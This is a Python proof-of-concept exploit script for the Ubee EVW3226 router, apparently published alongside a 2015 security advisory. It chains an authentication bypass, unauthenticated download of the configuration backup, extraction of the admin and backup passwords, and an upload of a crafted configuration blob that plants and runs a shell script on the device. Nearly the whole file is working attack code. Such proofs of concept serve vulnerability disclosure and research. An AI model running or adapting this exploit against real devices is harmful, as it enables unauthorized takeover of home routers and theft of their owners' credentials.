#
# POC code for Ubee EVW3226
#
# Demonstrates the following vulnerabilities
#  - Authentication bypass
#  - Unauthenticated backup file access
#  - Backup file password disclosure
#  - Code execution
#
# Credit: Gergely Eberhardt (@ebux25) from SEARCH-LAB Ltd. (www.search-lab.hu)
#
# Advisory: http://www.search-lab.hu/advisories/secadv-20150720

import sys
import requests
import tarfile
import struct
import binascii
import re
import shutil

config_data = binascii.unhexlify('00003226FFA486BE000001151F8B0808EB7D4D570400706F635F636F6E666967'
                                 '2E74617200EDD53D4FC3301006E09BF32BDC30A78E9D3816AC8811898185D104'
                                 '8B4404C7CA1DA4FC7B121A900A0296A66A153FCBF96BB15F9D8C0DCC2E1D68AD'
                                 '87FA61A7EE8E65AEB48254C86C38CE247F351DA767CFFBBEE7308F1724D33106'
                                 '5DDBD21FC7FEDD3F51DE20AE6933EBD5C6648B3CFF3D7F21BEE52F649E014BE1'
                                 '00169EFFD5F5CDED9DC88A730896081B5E3ED6C97DED3859A43556B077DBF667'
                                 '3FD6BFDA5F291052CB4CEA421502C6DF221707EEFF853A5BF1317BAC225B562D'
                                 'BB6C1D594709BD797BC1C86E88FBC6D46EBB1BC753AD4CF9641F1836AB389A96'
                                 '3C8A38F2F83975968687A5389A062C712682200882E058BC0383AF448C000E0000')

class ubee:
    def __init__(self, addr, port):
        self.addr = addr
        self.port = port
        self.s = requests.Session()

    def getUri(self, uri):
        return 'http://%s:%d/%s'%(self.addr,self.port,uri)

    def authenticationBypass(self):
        self.s.get(self.getUri('cgi-bin/setup.cgi?factoryBypass=1'))
        self.s.get(self.getUri('cgi-bin/setup.cgi?gonext=main2'))

    def parseNVRam(self, nv):
        o = 0x1c
        pos = 2
        nvdata = {}
        while(True):
            stype = struct.unpack('!H', nv[o:o+2])[0]
            slen = struct.unpack('!H', nv[o+2:o+4])[0]
            sval = nv[o+4:o+4+slen]
            nvdata[stype] = sval
            pos += slen
            o = o+slen+4
            if (o >= len(nv) ):
                break
        return nvdata

    def parseBackupFile(self, fname):
        tar = tarfile.open("Configuration_file.cfg", "r:gz")
        for tarinfo in tar:
            if tarinfo.isreg():
                if (tarinfo.name == 'pass.txt'):
                    print 'config file password: %s'%(tar.extractfile(tarinfo).read())
                elif (tarinfo.name == '1'):
                    nvdata = self.parseNVRam(tar.extractfile(tarinfo).read())
                    print 'admin password: %s'%(nvdata[3])
        tar.close()

    def saveBackup(self, r, fname):
        if r.status_code == 200:
            resp = ''
            for chunk in r:
                resp += chunk
            open(fname, 'wb').write(resp[0xc:])

    def createBackupFile(self, fname):
        # get validcode (CSRF token)
        r = self.s.get(self.getUri('cgi-bin/setup.cgi?gonext=RgSystemBackupAndRecoveryBackup'))
        m = re.search('ValidCode = "([^"]+)"', r.text)
        if (m == None):
            print 'ValidCode is not found'
            return
        validCode = m.group(1)

        # create backup file
        r = self.s.get(self.getUri('cgi-bin/setup.cgi?gonext=Configuration_file.cfg&Password=secretpass&ValidCode=%s')%(validCode))
        if (len(r.text) > 0):
            self.saveBackup(r, fname)

    def downloadBackupFile(self, fname):
        r = self.s.get(self.getUri('Configuration_file.cfg'))
        if (len(r.text) > 0):
            print len(r.text)
            self.saveBackup(r, fname)
            return True
        return False

    def restoreConfigFile(self, fname = '', passwd = 'badpasswd'):
        # get validcode (CSRF token)
        r = self.s.get(self.getUri('cgi-bin/setup.cgi?gonext=RgSystemBackupAndRecoveryRestore'))
        m = re.search('name="ValidCode" value="([^"]+)"', r.text)
        if (m == None):
            print 'ValidCode is not found'
            return
        validCode = m.group(1)

        # restore config file
        if (fname == ''):
            cfg_data = config_data
        else:
            cfg_data = open(fname, 'rb').read()
        r = self.s.post(self.getUri('cgi-bin/restore.cgi'), files=(('ValidCode', (None, validCode)), ('PasswordStr', (None, passwd)), ('browse', cfg_data), ('file_name', (None, 'Configuration_file.cfg'))))
        if (r.text.find('alert("Password Failure!")') > 0):
            return True
        else:
            return False

    def getShellResponse(self):
        r = self.s.get(self.getUri('cgi-bin/test.sh'))
        print r.text

#------------------------------------

if (len(sys.argv) < 2):
    print 'ubee_evw3226_poc.py addr [port]'
addr = sys.argv[1]
port = 80
if (len(sys.argv) == 3):
    port = int(sys.argv[2])

# create ubee object
u = ubee(addr, port)

# perform authentication bypass
u.authenticationBypass()
# download backup file if it is exists (auth is not required)
if (not u.downloadBackupFile('Configuration_file.cfg')):
    # create and download backup file (auth required)
    u.createBackupFile('Configuration_file.cfg')
# parse downloaded file and get admin and backup file password
u.parseBackupFile('Configuration_file.cfg')
# execute shell command in the router
if (u.restoreConfigFile()):
    print 'Shell installed'
    u.getShellResponse()
else:
    print 'Shell install failed'